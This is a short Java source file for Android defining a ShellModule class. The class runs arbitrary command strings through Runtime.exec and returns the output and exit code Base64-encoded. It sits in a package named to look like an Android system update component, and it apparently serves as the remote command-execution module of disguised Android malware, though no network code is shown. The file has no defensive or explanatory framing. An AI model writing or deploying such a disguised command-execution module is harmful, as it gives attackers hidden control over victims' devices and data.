package com.android.system.update.modules;

import android.util.Base64;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellModule {
    
    public ShellModule() {
    }
    
    public String executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            String result = "Exit Code: " + exitCode + "\n" + output.toString();
            
            return Base64.encodeToString(result.getBytes(), Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
}